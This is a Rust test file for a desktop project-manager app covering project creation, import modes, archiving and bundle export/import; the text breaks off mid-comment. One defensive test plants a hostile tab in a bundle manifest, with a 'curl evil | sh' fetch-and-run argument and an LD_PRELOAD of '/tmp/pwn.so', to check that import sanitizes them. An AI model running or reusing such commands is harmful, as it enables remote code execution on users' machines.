use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::{Mutex, OnceLock};

use app_lib::commands::project_transfer::{
    export_project_blocking, import_project_export_blocking, inspect_project_export,
    preview_project_export, ExportProjectRequest, ImportBundleRequest,
};
use app_lib::commands::projects::{
    archive_project_blocking, create_project_blocking, delete_archived_project, get_projects,
    import_project_blocking, list_archived_projects, load_project,
    restore_archived_project_blocking, save_projects,
    set_project_auto_connect, set_project_description, set_project_remote_control,
    set_project_sandbox, set_project_sandbox_spec, CreateProjectRequest, ImportProjectRequest,
    CLAUDE_SETTINGS, GITIGNORE_DEFAULT, SCAFFOLD_FILES,
};
use app_lib::schema::project::{
    RemoteSpec, SandboxScope, SandboxSourceDecision, SandboxSpec, SandboxToggleOutcome,
};
use tempfile::{Builder, TempDir};

/// The backend's own scaffold table plus the two pieces `scaffold_project`
/// writes separately. Derived from the constants rather than copied, so a
/// change to a scaffold template can't leave these assertions asserting text
/// nothing writes any more.
fn scaffolds() -> Vec<(&'static str, &'static str)> {
    let mut v: Vec<(&str, &str)> = SCAFFOLD_FILES.to_vec();
    v.push((".gitignore", GITIGNORE_DEFAULT));
    v.push((".claude/settings.json", CLAUDE_SETTINGS));
    v
}

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .expect("src-tauri has parent")
        .to_path_buf()
}

fn test_projects_root() -> PathBuf {
    repo_root().join("test_projects")
}

fn test_lock() -> &'static Mutex<()> {
    static LOCK: OnceLock<Mutex<()>> = OnceLock::new();
    LOCK.get_or_init(|| Mutex::new(()))
}

/// Every env var the backend resolves user-state locations from. `HOME` feeds
/// `paths::home_dir`/`storage::state_dir` on Unix; on Windows `home_dir` reads
/// `USERPROFILE` (then `HOMEDRIVE`/`HOMEPATH`) and `state_dir` reads `APPDATA` —
/// overriding only `HOME` there sent every test write into the REAL
/// `~\tabtivity\projects` and `%APPDATA%\tabtivity\projects.json` (junk projects in
/// the user's live store). All of them must point into the temp home.
const HOME_ENV_KEYS: &[&str] = &["HOME", "USERPROFILE", "HOMEDRIVE", "HOMEPATH", "APPDATA"];

struct HomeGuard {
    old: Vec<(&'static str, Option<std::ffi::OsString>)>,
}

impl HomeGuard {
    fn set(home: &Path) -> Self {
        // Env is mutated only while holding the test lock.
        let old = HOME_ENV_KEYS
            .iter()
            .map(|&key| (key, env::var_os(key)))
            .collect();
        unsafe {
            env::set_var("HOME", home);
            env::set_var("USERPROFILE", home);
            // Neutralize the HOMEDRIVE/HOMEPATH fallback rather than try to
            // split a temp path into drive+path.
            env::remove_var("HOMEDRIVE");
            env::remove_var("HOMEPATH");
            env::set_var("APPDATA", home.join("AppData").join("Roaming"));
        }
        Self { old }
    }
}

impl Drop for HomeGuard {
    fn drop(&mut self) {
        // Restore the caller's env as soon as the scoped test ends.
        unsafe {
            for (key, value) in &self.old {
                match value {
                    Some(v) => env::set_var(key, v),
                    None => env::remove_var(key),
                }
            }
        }
    }
}

fn with_isolated_home<T>(prefix: &str, f: impl FnOnce(&Path) -> T) -> T {
    let _guard = test_lock().lock().expect("test lock");
    let base = test_projects_root();
    fs::create_dir_all(&base).expect("create test_projects root");

    let home = Builder::new()
        .prefix(prefix)
        .tempdir_in(&base)
        .expect("tempdir in test_projects");
    let _home_guard = HomeGuard::set(home.path());

    f(home.path())
}

fn tempdir_in_test_projects(prefix: &str) -> TempDir {
    let base = test_projects_root();
    fs::create_dir_all(&base).expect("create test_projects root");
    Builder::new()
        .prefix(prefix)
        .tempdir_in(&base)
        .expect("tempdir in test_projects")
}

fn write_scaffold(dir: &Path, name: &str, content: &str) {
    let path = dir.join(name);
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).expect("create scaffold parent");
    }
    fs::write(path, content).expect("write scaffold");
}

fn seed_project(dir: &Path, tag: &str) {
    fs::create_dir_all(dir).expect("create project dir");
    write_scaffold(dir, "AGENTS.md", &format!("{tag}:agents\n"));
    write_scaffold(dir, "TODO.md", &format!("{tag}:todo\n"));
    write_scaffold(dir, ".gitignore", &format!("{tag}:gitignore\n"));
    write_scaffold(
        dir,
        ".claude/settings.json",
        &format!(r#"{{"marker":"{tag}"}}"#),
    );
    fs::write(dir.join("notes.txt"), format!("{tag}:notes\n")).expect("write notes");
    fs::create_dir_all(dir.join("nested")).expect("create nested dir");
    fs::write(dir.join("nested/info.txt"), format!("{tag}:nested\n")).expect("write nested file");
}

fn assert_scaffold_state(dir: &Path, tag: &str) {
    for (name, default_content) in scaffolds() {
        let path = dir.join(name);
        assert!(path.exists(), "missing scaffold: {name}");
        let actual = fs::read_to_string(&path).expect("read scaffold");
        let expected = match name {
            "AGENTS.md" => format!("{tag}:agents\n"),
            "TODO.md" => format!("{tag}:todo\n"),
            ".gitignore" => format!("{tag}:gitignore\n"),
            ".claude/settings.json" => format!(r#"{{"marker":"{tag}"}}"#),
            _ => default_content.to_string(),
        };
        assert_eq!(actual, expected, "unexpected contents for {name}");
    }
}

fn assert_project_registered(expected_local_file: &Path, expected_name: &str) {
    let projects = get_projects().expect("get projects");
    let entry = projects
        .iter()
        .find(|p| Path::new(&p.local_file) == expected_local_file)
        .unwrap_or_else(|| panic!("project not registered: {}", expected_local_file.display()));
    assert_eq!(entry.name, expected_name);
    assert_eq!(entry.status, "inactive");
}

#[test]
fn corrupt_projects_registry_is_never_replaced_with_a_default() {
    with_isolated_home("corrupt-registry-home", |_| {
        let path = app_lib::storage::state_dir().join("projects.json");
        fs::create_dir_all(path.parent().unwrap()).expect("state dir");
        fs::write(&path, b"{broken").expect("corrupt registry fixture");

        assert!(save_projects(Vec::new()).is_err());
        assert_eq!(fs::read(path).unwrap(), b"{broken");
    });
}

#[test]
fn stale_frontend_save_preserves_a_newer_entry_patch() {
    with_isolated_home("stale-save-home", |_| {
        let target = tempdir_in_test_projects("stale-save-target");
        let entry = create_project_blocking(CreateProjectRequest {
            name: "stale-save".to_string(),
            directory: target.path().join("project").to_string_lossy().to_string(),
            description: None,
            git_type: None,
            git_provider: None,
            skip_scaffold: false,
            remote: None,
            mirror_parent: None,
            vm: None,
        })
        .expect("create project");
        let mut stale = get_projects().expect("load stale snapshot");

        set_project_description(entry.id.clone(), Some("newer".to_string()))
            .expect("patch description");
        stale
            .iter_mut()
            .find(|project| project.id == entry.id)
            .expect("stale entry")
            .status = "active".to_string();
        save_projects(stale).expect("save stale frontend snapshot");

        let current = get_projects().expect("reload registry");
        let current = current
            .iter()
            .find(|project| project.id == entry.id)
            .expect("current entry");
        assert_eq!(current.status, "active");
        assert_eq!(
            current
                .extra
                .get("description")
                .and_then(|value| value.as_str()),
            Some("newer")
        );
    });
}

/// A new project never moves into a folder that is already there: the files
/// stay byte-for-byte, no `project.json` is written, nothing is registered.
/// (Importing is the verb for an existing folder — see the import tests below.)
#[test]
fn create_project_refuses_an_existing_folder() {
    with_isolated_home("create-home", |_| {
        let target = tempdir_in_test_projects("create-target");
        seed_project(target.path(), "create");

        let req = CreateProjectRequest {
            name: "create-project".to_string(),
            directory: target.path().to_string_lossy().to_string(),
            description: Some("Create description".to_string()),
            git_type: None,
            git_provider: None,
            skip_scaffold: false,
            remote: None,
            mirror_parent: None,
            vm: None,
        };

        let err = create_project_blocking(req).expect_err("an existing folder is refused");
        assert!(err.contains("already exists"), "{err}");

        assert_eq!(fs::read_to_string(target.path().join("AGENTS.md")).unwrap(), "create:agents\n");
        assert_eq!(fs::read_to_string(target.path().join("TODO.md")).unwrap(), "create:todo\n");
        assert_eq!(fs::read_to_string(target.path().join(".gitignore")).unwrap(), "create:gitignore\n");
        assert_eq!(
            fs::read_to_string(target.path().join(".claude/settings.json")).unwrap(),
            r#"{"marker":"create"}"#
        );
        assert!(!target.path().join("CLAUDE.md").exists(), "nothing scaffolded");
        assert!(!target.path().join("project.json").exists());
        assert!(!target.path().join(".git").exists());
        assert!(get_projects().expect("get projects").is_empty());
    });
}

/// The same refusal for an existing folder that holds nothing at all — and a
/// fresh one next to it is created and scaffolded as usual.
#[test]
fn create_project_refuses_an_existing_empty_folder_but_creates_a_fresh_one() {
    with_isolated_home("create-empty-home", |_| {
        let target = tempdir_in_test_projects("create-empty-target");
        let req = |dir: &Path| CreateProjectRequest {
            name: "create-project".to_string(),
            directory: dir.to_string_lossy().to_string(),
            description: None,
            git_type: Some("none".to_string()),
            git_provider: None,
            skip_scaffold: false,
            remote: None,
            mirror_parent: None,
            vm: None,
        };

        assert!(create_project_blocking(req(target.path())).is_err());
        assert_eq!(fs::read_dir(target.path()).unwrap().count(), 0);

        let fresh = target.path().join("fresh");
        let entry = create_project_blocking(req(&fresh)).expect("create into a new folder");
        assert_eq!(entry.local_file, fresh.join("project.json").to_string_lossy());
        assert!(fresh.join("AGENTS.md").is_file());
        assert_project_registered(&fresh.join("project.json"), "create-project");
    });
}

/// A new **git-backed** remote project starts with lockstep ON, so the git-tracked
/// tree is kept in step semantically (commits/refs) from the first launch instead
/// of waiting for the user to find the toggle. This is the same default
/// `extend_project_to_remote` applies, and it is safe for the same reason: the host
/// root was just created empty, so the first pass can only seed one direction.
///
/// The companion half of the default is that byte-sync stays opt-in per path (no
/// marker ⇒ `is_auto` false), which is what leaves gitignored host-side data — the
/// experiment output a remote project exists to produce — where it is.
#[test]
fn create_remote_project_enables_lockstep_when_git_backed() {
    with_isolated_home("remote-lockstep-home", |_| {
        let mirror_parent = tempdir_in_test_projects("remote-ls-mirror");
        let req = CreateProjectRequest {
            name: "remote-git-project".to_string(),
            directory: String::new(),
            description: None,
            git_type: Some("local".to_string()),
            git_provider: None,
            skip_scaffold: false,
            remote: Some(RemoteSpec {
                user: Some("alice".to_string()),
                host: "nonexistent.invalid".to_string(),
                port: None,
                remote_path: "/home/alice/work".to_string(),
                openvpn: None,
                auto_connect: None,
                key_auth: None,
                persist_sessions: None,
                vm: None,
                label: None,
                extra: Default::default(),
            }),
            mirror_parent: Some(mirror_parent.path().to_string_lossy().to_string()),
            vm: None,
        };

        let entry = create_project_blocking(req).expect("create remote git project");
        let state = app_lib::services::git_peer::load_state(&entry.id);
        assert!(
            state.enabled,
            "a git-backed remote project should start with lockstep enabled"
        );
    });
}

/// The gate is the mirror actually being a repo, not the `git_type` tag: a
/// `none` project has no history to seed a pairing from, so lockstep stays off
/// (its default) rather than being enabled over an empty non-repo.
#[test]
fn create_remote_project_leaves_lockstep_off_without_git() {
    with_isolated_home("remote-nolockstep-home", |_| {
        let mirror_parent = tempdir_in_test_projects("remote-nols-mirror");
        let req = CreateProjectRequest {
            name: "remote-plain-project".to_string(),
            directory: String::new(),
            description: None,
            git_type: Some("none".to_string()),
            git_provider: None,
            skip_scaffold: false,
            remote: Some(RemoteSpec {
                user: Some("alice".to_string()),
                host: "nonexistent.invalid".to_string(),
                port: None,
                remote_path: "/home/alice/work".to_string(),
                openvpn: None,
                auto_connect: None,
                key_auth: None,
                persist_sessions: None,
                vm: None,
                label: None,
                extra: Default::default(),
            }),
            mirror_parent: Some(mirror_parent.path().to_string_lossy().to_string()),
            vm: None,
        };

        let entry = create_project_blocking(req).expect("create remote non-git project");
        let state = app_lib::services::git_peer::load_state(&entry.id);
        assert!(
            !state.enabled,
            "a non-git remote project has nothing to keep in step; lockstep stays off"
        );
    });
}

#[test]
fn create_remote_project_scaffolds_the_local_mirror() {
    with_isolated_home("remote-home", |_| {
        // Where the local mirror twin (working copy) should land. The host is a
        // reserved `.invalid` name so the best-effort remote `mkdir -p` fails fast
        // (NXDOMAIN) without touching the network — scaffolding the mirror must
        // happen regardless, since bytes only reach the host on a manual push.
        let mirror_parent = tempdir_in_test_projects("remote-mirror");

        let req = CreateProjectRequest {
            name: "remote-project".to_string(),
            directory: String::new(),
            description: Some("Remote description".to_string()),
            git_type: Some("none".to_string()),
            git_provider: None,
            skip_scaffold: false,
            remote: Some(RemoteSpec {
                user: Some("alice".to_string()),
                host: "nonexistent.invalid".to_string(),
                port: None,
                remote_path: "/home/alice/work".to_string(),
                openvpn: None,
                auto_connect: None,
                key_auth: None,
                persist_sessions: None,
                vm: None,
                label: None,
                extra: Default::default(),
            }),
            mirror_parent: Some(mirror_parent.path().to_string_lossy().to_string()),
            vm: None,
        };

        let entry = create_project_blocking(req).expect("create remote project");
        assert!(
            entry.extra.contains_key("remote"),
            "entry should carry a remote spec"
        );

        // The scaffold lives in the local mirror, not the (project.json-only)
        // state directory the entry's local_file points at.
        let mirror = entry
            .extra
            .get("mirror")
            .and_then(|v| v.as_str())
            .expect("remote entry carries a mirror path");
        let mirror_dir = Path::new(mirror);
        for (name, default_content) in scaffolds() {
            // `.gitignore` is a git-axis artifact: a `git_type: "none"` project
            // never gets one written, so it must be absent from the mirror.
            if name == ".gitignore" {
                assert!(
                    !mirror_dir.join(name).exists(),
                    "git_type none must not scaffold a .gitignore"
                );
                continue;
            }
            let path = mirror_dir.join(name);
            assert!(path.exists(), "missing mirror scaffold: {name}");
            let actual = fs::read_to_string(&path).expect("read mirror scaffold");
            assert_eq!(actual, default_content, "unexpected contents for {name}");
        }

        // git_type "none" means no repo was initialized in the mirror.
        assert!(
            !mirror_dir.join(".git").exists(),
            "git_type none must not init a mirror repo"
        );

        assert_project_registered(&PathBuf::from(&entry.local_file), "remote-project");
    });
}

#[test]
fn import_project_copy_creates_missing_scaffolds_without_overwriting_existing_ones() {
    with_isolated_home("copy-home", |_| {
        let source = tempdir_in_test_projects("copy-source");
        seed_project(source.path(), "copy");

        let req = ImportProjectRequest {
            source_dir: source.path().to_string_lossy().to_string(),
            name: "copy-project".to_string(),
            description: Some("Copy description".to_string()),
            git_type: None,
            git_provider: None,
            mode: "copy".to_string(),
            scaffold_fill_modes: None,
            manual_validation_confirmed: Some(true),
            skip_scaffold: false,
            remote: None,
            mirror_parent: None,
        };

        let entry = import_project_blocking(req).expect("import copy");
        let target = PathBuf::from(&entry.local_file)
            .parent()
            .expect("project file parent")
            .to_path_buf();

        assert_eq!(entry.name, "copy-project");
        assert_eq!(entry.status, "inactive");
        assert_eq!(
            entry.extra.get("description").and_then(|v| v.as_str()),
            Some("Copy description")
        );
        assert_eq!(
            entry.local_file,
            target.join("project.json").to_string_lossy()
        );
        assert!(source.path().exists(), "copy must keep the original source");
        assert!(
            source.path().join("notes.txt").exists(),
            "copy must keep source files"
        );

        assert_scaffold_state(&target, "copy");
        assert!(target.join("notes.txt").exists());
        assert!(target.join("nested/info.txt").exists());
        assert_project_registered(&target.join("project.json"), "copy-project");
    });
}

#[test]
fn import_project_move_creates_missing_scaffolds_without_overwriting_existing_ones() {
    with_isolated_home("move-home", |_| {
        let source = tempdir_in_test_projects("move-source");
        seed_project(source.path(), "move");

        let req = ImportProjectRequest {
            source_dir: source.path().to_string_lossy().to_string(),
            name: "move-project".to_string(),
            description: None,
            git_type: None,
            git_provider: None,
            mode: "move".to_string(),
            scaffold_fill_modes: None,
            manual_validation_confirmed: Some(true),
            skip_scaffold: false,
            remote: None,
            mirror_parent: None,
        };

        let entry = import_project_blocking(req).expect("import move");
        let target = PathBuf::from(&entry.local_file)
            .parent()
            .expect("project file parent")
            .to_path_buf();

        assert_eq!(entry.name, "move-project");
        assert_eq!(entry.status, "inactive");
        assert_eq!(
            entry.local_file,
            target.join("project.json").to_string_lossy()
        );
        assert!(
            !source.path().exists(),
            "move must remove the original source"
        );

        assert_scaffold_state(&target, "move");
        assert!(target.join("notes.txt").exists());
        assert!(target.join("nested/info.txt").exists());
        assert_project_registered(&target.join("project.json"), "move-project");
    });
}

#[test]
fn import_project_keep_creates_missing_scaffolds_in_place_without_overwriting_existing_ones() {
    with_isolated_home("keep-home", |_| {
        let source = tempdir_in_test_projects("keep-source");
        seed_project(source.path(), "keep");

        let req = ImportProjectRequest {
            source_dir: source.path().to_string_lossy().to_string(),
            name: "keep-project".to_string(),
            description: Some("Keep description".to_string()),
            git_type: None,
            git_provider: None,
            mode: "keep".to_string(),
            scaffold_fill_modes: None,
            manual_validation_confirmed: None,
            skip_scaffold: false,
            remote: None,
            mirror_parent: None,
        };

        let entry = import_project_blocking(req).expect("import keep");

        assert_eq!(entry.name, "keep-project");
        assert_eq!(entry.status, "inactive");
        assert_eq!(
            entry.extra.get("description").and_then(|v| v.as_str()),
            Some("Keep description")
        );
        assert_eq!(
            entry.local_file,
            source.path().join("project.json").to_string_lossy()
        );
        assert!(
            source.path().exists(),
            "keep must keep the source directory"
        );

        assert_scaffold_state(source.path(), "keep");
        assert!(source.path().join("notes.txt").exists());
        assert!(source.path().join("nested/info.txt").exists());
        assert_project_registered(&source.path().join("project.json"), "keep-project");
    });
}

#[test]
fn import_project_skip_scaffold_adds_no_files_but_inits_git() {
    with_isolated_home("skip-home", |_| {
        let source = tempdir_in_test_projects("skip-source");
        // A bare project with only its own file — no scaffold, no .git.
        fs::create_dir_all(source.path()).expect("create source dir");
        fs::write(source.path().join("notes.txt"), "own:notes\n").expect("write notes");

        let req = ImportProjectRequest {
            source_dir: source.path().to_string_lossy().to_string(),
            name: "skip-project".to_string(),
            description: None,
            git_type: None,
            git_provider: None,
            mode: "keep".to_string(),
            scaffold_fill_modes: None,
            manual_validation_confirmed: None,
            skip_scaffold: true,
            remote: None,
            mirror_parent: None,
        };

        let entry = import_project_blocking(req).expect("import skip-scaffold");

        // Only project.json is written; no scaffold files — but the project was
        // asked to be git (the default), so it gets a repo rather than a git label
        // with nothing on disk behind it.
        assert!(source.path().join("project.json").exists());
        assert!(source.path().join("notes.txt").exists());
        for name in &[
            "AGENTS.md",
            "CLAUDE.md",
            "TODO.md",
            "README.md",
            ".gitignore",
        ] {
            assert!(
                !source.path().join(name).exists(),
                "skip_scaffold must not create {name}"
            );
        }
        assert!(
            source.path().join(".git").is_dir(),
            "a git skip_scaffold import must still git init"
        );
        // No initial commit: the tree is the user's own files, not ours to stage.
        let head = std::process::Command::new("git")
            .args(["rev-parse", "--verify", "-q", "HEAD"])
            .current_dir(source.path())
            .output()
            .expect("git rev-parse");
        assert!(!head.status.success(), "skip_scaffold must not commit");
        assert_project_registered(&source.path().join("project.json"), "skip-project");
        // New projects default to the local push target.
        assert_eq!(
            entry.extra.get("git_type").and_then(|v| v.as_str()),
            Some("local")
        );
    });
}

#[test]
fn import_project_skip_scaffold_without_git_does_not_init() {
    with_isolated_home("skip-nogit-home", |_| {
        let source = tempdir_in_test_projects("skip-nogit-source");
        fs::create_dir_all(source.path()).expect("create source dir");
        fs::write(source.path().join("notes.txt"), "own:notes\n").expect("write notes");

        let req = ImportProjectRequest {
            source_dir: source.path().to_string_lossy().to_string(),
            name: "skip-nogit-project".to_string(),
            description: None,
            git_type: Some("none".to_string()),
            git_provider: None,
            mode: "keep".to_string(),
            scaffold_fill_modes: None,
            manual_validation_confirmed: None,
            skip_scaffold: true,
            remote: None,
            mirror_parent: None,
        };

        let entry = import_project_blocking(req).expect("import skip-scaffold no-git");

        assert!(!source.path().join(".git").exists());
        assert!(!source.path().join(".gitignore").exists());
        assert_eq!(
            entry.extra.get("git_type").and_then(|v| v.as_str()),
            Some("none")
        );
    });
}

#[test]
fn set_project_description_writes_both_projects_json_and_project_json() {
    with_isolated_home("desc-home", |_| {
        let target = tempdir_in_test_projects("desc-target");

        let entry = create_project_blocking(CreateProjectRequest {
            name: "desc-project".to_string(),
            directory: target.path().join("project").to_string_lossy().to_string(),
            description: Some("original".to_string()),
            git_type: None,
            git_provider: None,
            skip_scaffold: false,
            remote: None,
            mirror_parent: None,
            vm: None,
        })
        .expect("create project");

        // Update the description.
        let returned = set_project_description(entry.id.clone(), Some("updated desc".to_string()))
            .expect("set description");
        assert_eq!(returned.as_deref(), Some("updated desc"));

        // projects.json (the pill list) reflects it.
        let listed = get_projects().expect("get projects");
        let found = listed
            .iter()
            .find(|p| p.id == entry.id)
            .expect("entry present");
        assert_eq!(
            found.extra.get("description").and_then(|v| v.as_str()),
            Some("updated desc")
        );

        // project.json (the per-project file) reflects it too.
        let project = load_project(entry.local_file.clone()).expect("load project");
        assert_eq!(project.description.as_deref(), Some("updated desc"));

        // Clearing the description removes it from both stores.
        let cleared = set_project_description(entry.id.clone(), None).expect("clear description");
        assert!(cleared.is_none());
        let listed = get_projects().expect("get projects");
        let found = listed
            .iter()
            .find(|p| p.id == entry.id)
            .expect("entry present");
        assert!(!found.extra.contains_key("description"));
        let project = load_project(entry.local_file.clone()).expect("load project");
        assert!(project.description.is_none());
    });
}

// ── Archive (delete → restorable) ──────────────────────────────────────────

/// A registered local project over a seeded tree. `create_project` refuses a
/// folder that already exists, so the tree is registered the way any existing
/// folder is: an in-place (`keep`) import.
fn new_local_project(name: &str, target: &Path) -> app_lib::schema::projects::ProjectEntry {
    seed_project(target, name);
    import_project_blocking(ImportProjectRequest {
        source_dir: target.to_string_lossy().to_string(),
        name: name.to_string(),
        description: None,
        git_type: None,
        git_provider: None,
        mode: "keep".to_string(),
        scaffold_fill_modes: None,
        manual_validation_confirmed: None,
        skip_scaffold: false,
        remote: None,
        mirror_parent: None,
    })
    .expect("import project")
}

#[test]
fn archive_and_restore_local_project_roundtrip() {
    with_isolated_home("archive-home", |_| {
        let target = tempdir_in_test_projects("archive-target");
        let entry = new_local_project("arch-project", target.path());
        let id = entry.id.clone();
        let dir = target.path().to_path_buf();
        assert!(dir.join("project.json").exists());

        // Archive: the on-disk dir moves out and the pill drops from the list.
        archive_project_blocking(id.clone(), "2026-07-01T00:00:00+00:00".to_string()).expect("archive");
        assert!(
            !dir.join("project.json").exists(),
            "original project dir should have moved into the archive"
        );
        assert!(
            get_projects().unwrap().iter().all(|p| p.id != id),
            "archived project must be gone from projects.json"
        );
        let archived = list_archived_projects().expect("list archived");
        assert_eq!(archived.len(), 1);
        assert_eq!(archived[0].id, id);
        assert_eq!(archived[0].name, "arch-project");
        assert!(!archived[0].remote);

        // Restore: comes back inactive, the folder + files return, archive empties.
        let restored = restore_archived_project_blocking(id.clone()).expect("restore");
        assert_eq!(restored.status, "inactive");
        assert_eq!(restored.id, id);
        assert!(get_projects().unwrap().iter().any(|p| p.id == id));
        assert!(list_archived_projects().unwrap().is_empty());
        let restored_dir = PathBuf::from(&restored.local_file)
            .parent()
            .expect("restored project file parent")
            .to_path_buf();
        assert!(restored_dir.join("notes.txt").exists());
        assert!(restored_dir.join("nested/info.txt").exists());
    });
}

// ── Full project export / import (docs/context/project_transfer.md) ────────

/// Build an export request with every section on, writing to `dest`.
fn full_export(project_id: &str, dest: &Path) -> ExportProjectRequest {
    ExportProjectRequest {
        project_id: project_id.to_string(),
        dest_path: dest.to_string_lossy().to_string(),
        include_files: true,
        include_git: true,
        include_session: true,
        include_mirror: true,
        skip_rebuildable: true,
    }
}

fn plain_import(bundle: &Path, parent: &Path) -> ImportBundleRequest {
    ImportBundleRequest {
        bundle_path: bundle.to_string_lossy().to_string(),
        name: None,
        target_parent: Some(parent.to_string_lossy().to_string()),
        mirror_parent: None,
        restore_session: true,
        restore_time: true,
        join_boxes: true,
    }
}

/// The whole point of the feature: a project exported on one machine and
/// imported on another comes back with its files, its settings *and* its tabs —
/// not as a bare folder the user has to re-answer every question about.
#[test]
fn export_import_roundtrip_carries_files_settings_and_tabs() {
    with_isolated_home("transfer-home", |home| {
        let target = tempdir_in_test_projects("transfer-source");
        let entry = new_local_project("transfer-project", target.path());
        let id = entry.id.clone();

        // Settings that only live in the registry/project.json, plus a tab
        // layout that only lives in the state dir.
        set_project_description(id.clone(), Some("carried across".to_string()))
            .expect("set description");
        let tabs = vec![app_lib::schema::project::TabEntry {
            key: "t1".to_string(),
            label: "shell".to_string(),
            cmd: String::new(),
            cwd: target.path().join("nested").to_string_lossy().to_string(),
            session_id: None,
            extra: Default::default(),
        }];
        app_lib::services::terminal_service::save_tab_layout(
            Some(&id),
            &entry.local_file,
            &tabs,
            None,
            None,
            false,
        )
        .expect("save layout");

        let preview = preview_project_export(id.clone()).expect("preview");
        assert!(preview.blocked.is_none());
        assert!(preview.files > 0, "the seeded tree has files");
        assert_eq!(preview.tabs, 1);
        assert!(preview.suggested_file_name.ends_with(concat!(".", app_lib::app_slug!(), "proj")));

        let bundle = home.join(concat!("transfer-project.", app_lib::app_slug!(), "proj"));
        let report = export_project_blocking(full_export(&id, &bundle), &mut |_, _| {})
            .expect("export");
        assert!(bundle.is_file(), "the bundle must exist");
        assert!(report.files > 0);
        assert_eq!(report.path, bundle.to_string_lossy());

        // The dialog's pre-read: name, shape and "this id is already here".
        let info = inspect_project_export(bundle.to_string_lossy().to_string()).expect("inspect");
        assert_eq!(info.name, "transfer-project");
        assert_eq!(info.project_id, id);
        assert!(info.contents.dir);
        assert_eq!(info.tabs, 1);
        assert!(info.id_in_use, "the source project is still registered here");

        // Import beside the original: the id is taken, so a fresh one is minted
        // and the original is left exactly as it was.
        let landing = tempdir_in_test_projects("transfer-landing");
        let result = import_project_export_blocking(plain_import(&bundle, landing.path()))
            .expect("import");
        assert!(result.new_id, "an in-use id must not be reused");
        assert_ne!(result.entry.id, id);
        assert_eq!(result.entry.name, "transfer-project");
        assert_eq!(result.entry.status, "inactive");
        assert_eq!(
            result.entry.extra.get("description").and_then(|v| v.as_str()),
            Some("carried across"),
            "registry settings travel with the bundle"
        );

        let imported_dir = PathBuf::from(&result.directory);
        assert!(imported_dir.join("notes.txt").exists());
        assert!(imported_dir.join("nested/info.txt").exists());
        assert!(imported_dir.join("project.json").exists());
        assert!(target.path().join("notes.txt").exists(), "source untouched");

        // The tab came back, and its cwd was re-pointed at the new folder — a
        // layout still naming the old machine's paths would spawn into nothing.
        assert_eq!(result.tabs_restored, 1);
        let session = app_lib::services::terminal_service::load_terminal_session(&result.entry.id);
        assert_eq!(session.tab_layout.len(), 1);
        assert_eq!(
            session.tab_layout[0].cwd,
            imported_dir.join("nested").to_string_lossy(),
            "tab cwd must follow the folder"
        );

        // Both projects are registered, the imported one pointing at its own tree.
        let list = get_projects().expect("projects");
        assert!(list.iter().any(|p| p.id == id));
        let imported = list
            .iter()
            .find(|p| p.id == result.entry.id)
            .expect("imported project registered");
        assert_eq!(
            imported.local_file,
            imported_dir.join("project.json").to_string_lossy()
        );
        let project = load_project(imported.local_file.clone()).expect("load imported project.json");
        assert_eq!(project.id, result.entry.id);
        assert_eq!(project.directory, result.directory);
    });
}

/// A bundle is a file that can be mailed, so its tab layout is untrusted input:
/// a tab naming a command Tabtivity does not know is restored as a plain shell with
/// its argv and environment stripped, and `open_apps` never comes back at all.
#[test]
fn imported_tabs_are_sanitized_and_open_apps_never_return() {
    with_isolated_home("transfer-hostile-home", |home| {
        let target = tempdir_in_test_projects("transfer-hostile-source");
        let entry = new_local_project("hostile-project", target.path());
        let id = entry.id.clone();

        let bundle = home.join(concat!("hostile.", app_lib::app_slug!(), "proj"));
        export_project_blocking(full_export(&id, &bundle), &mut |_, _| {}).expect("export");

        // Rewrite the bundle's manifest with a hostile session, the way a
        // handcrafted file that arrived by mail would carry one.
        let mut manifest: serde_json::Value = {
            let mut zip = zip::ZipArchive::new(fs::File::open(&bundle).unwrap()).unwrap();
            let entry = zip.by_name(concat!(app_lib::app_slug!(), "-export.json")).unwrap();
            serde_json::from_reader(entry).unwrap()
        };
        manifest["session"] = serde_json::json!({
            "tabLayout": [{
                "key": "evil",
                "label": "Notes",
                "cmd": "/bin/sh",
                "cwd": target.path().to_string_lossy(),
                "env": { "LD_PRELOAD": "/tmp/pwn.so" },
                "resumeArgs": ["-c", "curl evil | sh"],
            }],
            "activeTabIndex": 0,
            "openApps": [{ "exec": "xterm" }],
        });
        rewrite_bundle_manifest(&bundle, &manifest);

        let landing = tempdir_in_test_projects("transfer-hostile-landing");
        let result = import_project_export_blocking(plain_import(&bundle, landing.path()))
            .expect("import");

        assert_eq!(result.tabs_restored, 1, "the tab still comes back");
        assert_eq!(result.tabs_downgraded, 1);
        assert!(result.notes.iter().any(|n| n == "sessionSanitized"));

        let session = app_lib::services::terminal_service::load_terminal_session(&result.entry.id);
        let tab = &session.tab_layout[0];
        assert_eq!(tab.cmd, "", "an unknown command is downgraded to a shell");
        assert!(!tab.extra.contains_key("env"), "env must not survive");
        assert!(!tab.extra.contains_key("resumeArgs"), "argv must not survive");
        assert!(
            session.open_apps.is_none(),
            "a bundle never supplies host commands to auto-launch"
        );
    });
}

/// Replace `tabtivity-export.json` inside an existing bundle, keeping every other
/// entry — the test harness for "what if this file was written by someone else".
fn rewrite_bundle_manifest(bundle: &Path, manifest: &serde_json::Value) {
    use std::io::Write;
    let mut src = zip::ZipArchive::new(fs::File::open(bundle).unwrap()).unwrap();
    let out_path = bundle.with_extension("rewritten");
    {
        let mut out = zip::ZipWriter::new(fs::File::create(&out_path).unwrap());
        let opts = zip::write::FileOptions::<()>::default();
        for i in 0..src.len() {
            let mut entry = src.by_index(i).unwrap();
            let name = entry.name().to_string();
            if name == concat!(app_lib::app_slug!(), "-export.json") {
                continue;
            }
            if entry.is_dir() {
                out.add_directory(name, opts).unwrap();
                continue;
            }
            let mut bytes = Vec::new();
            std::io::Read::read_to_end(&mut entry, &mut bytes).unwrap();
            out.start_file(name, opts).unwrap();
            out.write_all(&bytes).unwrap();
        }
        out.start_file(concat!(app_lib::app_slug!(), "-export.json"), opts).unwrap();
        out.write_all(&serde_json::to_vec(manifest).unwrap()).unwrap();
        out.finish().unwrap();
    }
    fs::rename(out_path, bundle).unwrap();
}

/// A VM project's working tree is its disk image, which no file copy can carry
/// — so it is refused before anything is written rather than exported into a
/// project that cannot boot on the far side.
#[test]
fn export_refuses_vm_projects() {
    with_isolated_home("transfer-blocked-home", |home| {
        let target = tempdir_in_test_projects("transfer-blocked-target");
        let entry = new_local_project("vm-ish-project", target.path());
        let id = entry.id.clone();

        // Tag it as a VM project the way `create_project` would. Written
        // straight to the registry: `save_projects` is the frontend's
